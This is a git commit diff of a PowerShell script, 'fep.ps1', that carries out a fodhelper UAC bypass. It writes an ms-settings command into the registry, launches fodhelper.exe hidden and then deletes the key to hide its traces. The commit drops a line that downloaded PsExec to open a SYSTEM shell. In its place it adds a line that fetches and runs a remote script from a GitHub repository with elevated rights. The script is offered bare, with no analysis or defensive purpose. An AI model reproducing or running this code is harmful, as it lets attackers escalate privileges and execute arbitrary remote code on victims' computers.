a323d9312db2cc818e7c3b506293f1b382d35ade
Peter Griffin <noreply.steampoqered.com.5@gmail.com>
2026-04-06 00:10:05 +0100

    Update fep.ps1

--- fep.ps1
+++ fep.ps1
@@ -1,10 +1,9 @@
-irm https://github.com/petergriuffin123/feg/raw/refs/heads/main/PsExec.exe -o psexec.exe
 Start-Sleep 3
 function ffv {
     $Key = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
     New-Item -Path $Key -Force
     New-ItemProperty -Path $Key -Name "DelegateExecute" -Value "" -Force
-    Set-ItemProperty -Path $Key -Name "(default)" -Value "$PWD\psexec.exe -i -s cmd.exe" -Force
+    Set-ItemProperty -Path $Key -Name "(default)" -Value "iex (irm https://raw.githubusercontent.com/petergriuffin123/feg/refs/heads/main/feg.ps1)" -Force
     Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
     Start-Sleep 3
     Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
